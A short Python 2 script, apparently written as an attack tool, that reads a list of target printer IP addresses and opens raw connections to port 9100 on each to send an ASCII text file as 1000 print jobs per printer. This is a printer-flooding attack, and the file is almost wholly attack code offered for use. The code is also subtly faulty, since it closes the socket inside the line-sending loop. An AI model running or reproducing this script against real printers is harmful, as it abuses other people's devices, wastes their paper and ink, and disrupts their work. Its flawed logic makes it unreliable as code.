import socket
f = open("IPs.txt", "r") #file containing IPs of target printers
lines = f.readlines()
print "-Reading IPs file-"
for ip in lines:
	textfile = open("bot.txt", "r") #ascii file to be printed
	textlines = textfile.readlines()
	for count in range(0,1000): #number of print jobs
		s = socket.socket()
		s.connect((ip, 9100))
		for line in textlines:
			s.send(line+"\n")
			print "-Sending to Printer-"
			s.close()